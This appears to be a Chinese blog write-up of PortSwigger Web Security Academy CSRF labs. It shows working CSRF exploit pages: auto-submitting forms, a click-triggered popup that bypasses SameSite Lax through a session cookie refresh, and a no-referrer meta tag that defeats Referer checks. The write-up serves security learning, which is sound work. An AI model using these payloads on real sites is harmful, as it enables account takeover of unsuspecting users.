<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"secdroid.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="0x01. PortSwigger Web Security AcademyPortSwigger Web Security Academy 是 Burp Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。 本篇文章讲解 Web Security Academy 之中的跨站请求伪造（CSRF，Cross-site req">
<meta property="og:type" content="article">
<meta property="og:title" content="Burp Web Academy CSRF 跨站请求伪造（三）">
<meta property="og:url" content="https://secdroid.github.io/2025/06/03/burp-web-academy-csrf-cross-site-request-forgery-part3/index.html">
<meta property="og:site_name" content="SecDroid">
<meta property="og:description" content="0x01. PortSwigger Web Security AcademyPortSwigger Web Security Academy 是 Burp Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。 本篇文章讲解 Web Security Academy 之中的跨站请求伪造（CSRF，Cross-site req">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2025-06-03T15:57:45.449Z">
<meta property="article:modified_time" content="2025-06-03T15:57:13.000Z">
<meta property="article:author" content="Livermore">
<meta property="article:tag" content="Burp">
<meta property="article:tag" content="CSRF">
<meta property="article:tag" content="Referer">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://secdroid.github.io/2025/06/03/burp-web-academy-csrf-cross-site-request-forgery-part3/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://secdroid.github.io/2025/06/03/burp-web-academy-csrf-cross-site-request-forgery-part3/","path":"2025/06/03/burp-web-academy-csrf-cross-site-request-forgery-part3/","title":"Burp Web Academy CSRF 跨站请求伪造（三）"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Burp Web Academy CSRF 跨站请求伪造（三） | SecDroid</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">SecDroid</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">A security researcher who's looking for a job</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>链接</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-PortSwigger-Web-Security-Academy"><span class="nav-number">1.</span> <span class="nav-text">0x01. PortSwigger Web Security Academy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-CSRF"><span class="nav-number">2.</span> <span class="nav-text">0x02. CSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-Lab-SameSite-Lax-bypass-via-cookie-refresh"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 Lab: SameSite Lax bypass via cookie refresh</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-Lab-CSRF-where-Referer-validation-depends-on-header-being-present"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 Lab: CSRF where Referer validation depends on header being present</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-Lab-CSRF-with-broken-Referer-validation"><span class="nav-number">2.3.</span> <span class="nav-text">2.3 Lab: CSRF with broken Referer validation</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E6%80%BB%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">0x03. 总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3"><span class="nav-number">4.</span> <span class="nav-text">0x04. 参考文档</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Livermore</p>
  <div class="site-description" itemprop="description">SecDroid's Diary</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">40</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">14</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">57</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://secdroid.github.io/2025/06/03/burp-web-academy-csrf-cross-site-request-forgery-part3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Livermore">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SecDroid">
      <meta itemprop="description" content="SecDroid's Diary">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="Burp Web Academy CSRF 跨站请求伪造（三） | SecDroid">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Burp Web Academy CSRF 跨站请求伪造（三）
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2025-06-03 23:57:45 / 修改时间：23:57:13" itemprop="dateCreated datePublished" datetime="2025-06-03T23:57:45+08:00">2025-06-03</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Vulnerability/" itemprop="url" rel="index"><span itemprop="name">Vulnerability</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Vulnerability/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Vulnerability/Web/Burp-Web-Academy/" itemprop="url" rel="index"><span itemprop="name">Burp Web Academy</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h2 id="0x01-PortSwigger-Web-Security-Academy"><a href="#0x01-PortSwigger-Web-Security-Academy" class="headerlink" title="0x01. PortSwigger Web Security Academy"></a>0x01. PortSwigger Web Security Academy</h2><p>PortSwigger Web Security Academy 是 <a href="https://secdroid.github.io/tags/Burp/">Burp</a> Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。</p>
<p>本篇文章讲解 <a href="https://secdroid.github.io/categories/Vulnerability/Web/Burp-Web-Academy/">Web Security Academy</a> 之中的跨站请求伪造（CSRF，Cross-site request forgery）章节。</p>
<span id="more"></span>

<ul>
<li><a href="https://secdroid.github.io/2025/02/12/burp-web-academy-csrf-cross-site-request-forgery/">Burp Web Academy CSRF 跨站请求伪造（一）</a></li>
<li><a href="https://secdroid.github.io/2025/05/28/burp-web-academy-csrf-cross-site-request-forgery-part2/">Burp Web Academy CSRF 跨站请求伪造（二）</a></li>
<li><a href="https://secdroid.github.io/2025/06/03/burp-web-academy-csrf-cross-site-request-forgery-part3/">Burp Web Academy CSRF 跨站请求伪造（三）</a></li>
</ul>
<h2 id="0x02-CSRF"><a href="#0x02-CSRF" class="headerlink" title="0x02. CSRF"></a>0x02. CSRF</h2><h3 id="2-1-Lab-SameSite-Lax-bypass-via-cookie-refresh"><a href="#2-1-Lab-SameSite-Lax-bypass-via-cookie-refresh" class="headerlink" title="2.1 Lab: SameSite Lax bypass via cookie refresh"></a>2.1 Lab: SameSite Lax bypass via cookie refresh</h3><blockquote>
<p>This lab’s change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim’s email address. You should use the provided exploit server to host your attack.</p>
<p>The lab supports OAuth-based login. You can log in via your social media account with the following credentials: <code>wiener:peter</code></p>
</blockquote>
<p>先登录进去，然后尝试修改 Email，对应的 HTTP 请求包如下：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/my-account/change-email</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0aee003a03c37b8a813b20d900bf005d.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=3125ORVOwis48ps5KwTf7DKz6O37bE9b</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>31</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">email</span><span class="operator">=</span>wiener1%<span class="number">40</span>normal-user.net</span></span><br></pre></td></tr></table></figure>

<p>可以看到，没有 CSRF 防御机制。此时，往回查找 Cookie 的设置，发现是 <code>/oauth-callback</code> 设置的：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/oauth-callback?code=kq3Hxh2OungnyMxEAWgEGpl7RMIl-Sl-sNDYmgnIJon</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0aee003a03c37b8a813b20d900bf005d.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=4bEzBdMx9Er5uWSb8g9WSquMtSddmhLM</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br></pre></td></tr></table></figure>

<p>且 <code>Set-Cookie</code> 没有指明 <code>SameSite</code> 策略，浏览器会使用默认的 <code>Lax</code> 策略（关于 <code>Lax</code> 策略的解释可以参考 <a href="https://secdroid.github.io/2025/02/12/burp-web-academy-csrf-cross-site-request-forgery/">Burp Web Academy CSRF 跨站请求伪造</a>）：</p>
<blockquote>
<p><code>Lax</code> 意味着 Cookie 不会在跨站请求中被发送，如：加载图像或框架（frame）的请求。<strong>但 Cookie 在用户从外部站点导航到源站时</strong>，Cookie 也会被发送（例如，访问一个链接）。这是 <code>SameSite</code> 属性未被设置时的默认行为。</p>
</blockquote>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/2</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>session=3125ORVOwis48ps5KwTf7DKz6O37bE9b; Expires=Wed, 04 Jun 2025 12:54:20 UTC; Secure; HttpOnly</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>2948</span><br></pre></td></tr></table></figure>

<p>于是，直接构造如下 Exploit：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">https://0aee003a03c37b8a813b20d900bf005d.web-security-academy.net/my-account/change-email</span> <span class="attr">method</span>=<span class="string">POST</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;test@normal-user.net&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>连续访问两次，就可以修改受害者的 Email。虽然解决了问题，但是没有弄明白到底怎么 回事。官方参考答案如下：</p>
<blockquote>
<p><strong>Bypass the SameSite restrictions</strong></p>
<ol>
<li><p>In the browser, notice that if you visit <code>/social-login</code>, this automatically initiates the full OAuth flow. If you still have a logged-in session with the OAuth server, this all happens without any interaction.</p>
</li>
<li><p>From the proxy history, notice that every time you complete the OAuth flow, the target site sets a new session cookie even if you were already logged in.</p>
</li>
<li><p>Go back to the exploit server.</p>
</li>
<li><p>Change the JavaScript so that the attack first refreshes the victim’s session by forcing their browser to visit <code>/social-login</code>, then submits the email change request after a short pause. The following is one possible approach:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=&quot;POST&quot; action=&quot;https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;pwned@web-security-academy.net&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    window.open(&#x27;https://YOUR-LAB-ID.web-security-academy.net/social-login&#x27;);</span><br><span class="line">    setTimeout(changeEmail, 5000);</span><br><span class="line"></span><br><span class="line">    function changeEmail()&#123;</span><br><span class="line">        document.forms[0].submit();</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>Note that we’ve opened the <code>/social-login</code> in a new window to avoid navigating away from the exploit before the change email request is sent.</p>
</li>
<li><p>Store and view the exploit yourself. Observe that the initial request gets blocked by the browser’s popup blocker.</p>
</li>
<li><p>Observe that, after a pause, the CSRF attack is still launched. However, this is only successful if it has been less than two minutes since your cookie was set. If not, the attack fails because the popup blocker prevents the forced cookie refresh.</p>
</li>
</ol>
</blockquote>
<blockquote>
<p><strong>Bypass the popup blocker</strong></p>
<ol>
<li><p>Realize that the popup is being blocked because you haven’t manually interacted with the page.</p>
</li>
<li><p>Tweak the exploit so that it induces the victim to click on the page and only opens the popup once the user has clicked. The following is one possible approach:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=&quot;POST&quot; action=&quot;https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;pwned@portswigger.net&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;p&gt;Click anywhere on the page&lt;/p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    window.onclick = () =&gt; &#123;</span><br><span class="line">        window.open(&#x27;https://YOUR-LAB-ID.web-security-academy.net/social-login&#x27;);</span><br><span class="line">        setTimeout(changeEmail, 5000);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function changeEmail() &#123;</span><br><span class="line">        document.forms[0].submit();</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Test the attack on yourself again while monitoring the proxy history in Burp.</p>
</li>
<li><p>When prompted, click the page. This triggers the OAuth flow and issues you a new session cookie. After 5 seconds, notice that the CSRF attack is sent and the <code>POST /my-account/change-email</code> request includes your new session cookie.</p>
</li>
<li><p>Go to your account page and confirm that your email address has changed.</p>
</li>
<li><p>Change the email address in your exploit so that it doesn’t match your own.</p>
</li>
<li><p>Deliver the exploit to the victim to solve the lab.</p>
</li>
</ol>
</blockquote>
<p>简单说，CSRF 利用需要解决两个问题：</p>
<ul>
<li>Cookie 可能过期了，此时只要 OAuth 的 session 还有效，访问 <code>/social-login</code> 会自动刷新 Cookie</li>
<li>为了刷新 Cookie 之后继续执行表单提交动作，需要借助 <code>window.open</code> 打开 <code>/social-login</code>，但是由于没有用户交互，弹窗会被拦截<ul>
<li>通过 <code>window.onclick</code> 响应页面上的任意点击事件，实现绕过浏览器对 <code>window.open</code> 的拦截</li>
<li>Hint 提示受害者会点击任何访问的页面（在页面点击鼠标对于真实攻击场景也是合理的）</li>
</ul>
</li>
</ul>
<h3 id="2-2-Lab-CSRF-where-Referer-validation-depends-on-header-being-present"><a href="#2-2-Lab-CSRF-where-Referer-validation-depends-on-header-being-present" class="headerlink" title="2.2 Lab: CSRF where Referer validation depends on header being present"></a>2.2 Lab: CSRF where Referer validation depends on header being present</h3><blockquote>
<p>This lab’s email change functionality is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback.</p>
<p>To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.</p>
<p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>
</blockquote>
<p>登录之后的 Cookie 设置为 <code>SameSite=None; Secure</code>，如下所示：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/2</span> <span class="number">302</span> Found</span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>/my-account?id=wiener</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>session=R643iIlfJuAIy979s41HIBu7oOnR4UOk; Secure; HttpOnly; SameSite=None</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure>

<p>因此，任何请求的发送都会带上 Cookie，先简单测试 CSRF 攻击：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">https://0a9600c704b4c6f0801603b900980019.web-security-academy.net/my-account/change-email</span> <span class="attr">method</span>=<span class="string">POST</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1@normal-user.net&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问后提示 <code>&quot;Invalid referer header&quot;</code>，结合题目的标题，看起来是对 <code>Referer</code> 进行了校验。然而 <code>Referer</code> 是 <code>Forbidden request header</code>，浏览器是不允许对其进行修改的：</p>
<blockquote>
<p>A <strong>forbidden request header</strong> is an <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers">HTTP header</a> name-value pair that cannot be set or modified programmatically in a request. For headers forbidden to be modified in responses, see <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_response_header_name">forbidden response header name</a>.</p>
<p>Modifying such headers is forbidden because the user agent retains full control over them.</p>
</blockquote>
<p>不能修改，可以尝试禁止添加 Referer。问了下 Copilot，发现有多种方法：</p>
<ul>
<li>可以利用 <code>&lt;a&gt;</code> 标签或者 <code>&lt;form&gt;</code> 的 <code>target=&quot;_blank&quot;</code> 让 Referer 为空</li>
<li>通过 <code>meta</code> 标签影响页面 Referer 发送策略</li>
</ul>
<p>一个可行的利用代码如下所示：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;referrer&quot;</span> <span class="attr">content</span>=<span class="string">&quot;no-referrer&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">https://0a9600c704b4c6f0801603b900980019.web-security-academy.net/my-account/change-email</span> <span class="attr">method</span>=<span class="string">POST</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2@normal-user.net&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="2-3-Lab-CSRF-with-broken-Referer-validation"><a href="#2-3-Lab-CSRF-with-broken-Referer-validation" class="headerlink" title="2.3 Lab: CSRF with broken Referer validation"></a>2.3 Lab: CSRF with broken Referer validation</h3><blockquote>
<p>This lab’s email change functionality is vulnerable to CSRF. It attempts to detect and block cross domain requests, but the detection mechanism can be bypassed.</p>
<p>To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.</p>
<p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>
</blockquote>
<p>看起来跟上一题差不多，先直接测试利用代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;referrer&quot;</span> <span class="attr">content</span>=<span class="string">&quot;no-referrer&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">https://0a1e0028030fb82e80dd0d3b007400d0.web-security-academy.net/my-account/change-email</span> <span class="attr">method</span>=<span class="string">POST</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2@normal-user.net&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>即使 <code>Referer</code> 不在，也会提示 <code>&quot;Invalid referer header&quot;</code>。需要绕过检测逻辑，但是并不知道检测逻辑的细节。</p>
<p>对 <code>Referer</code> 的检查应该是严谨的，否则很容易被绕过，参考 <a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html">Cross-Site Request Forgery Prevention - OWASP Cheat Sheet Series</a>：</p>
<blockquote>
<p><strong>Checking the Origin Header</strong></p>
<p>If the Origin header is present, verify that its value matches the target origin. Unlike the referer, the Origin header will be present in HTTP requests that originate from an HTTPS URL.</p>
<p><strong>Checking the Referer Header if Origin Header Is Not Present</strong></p>
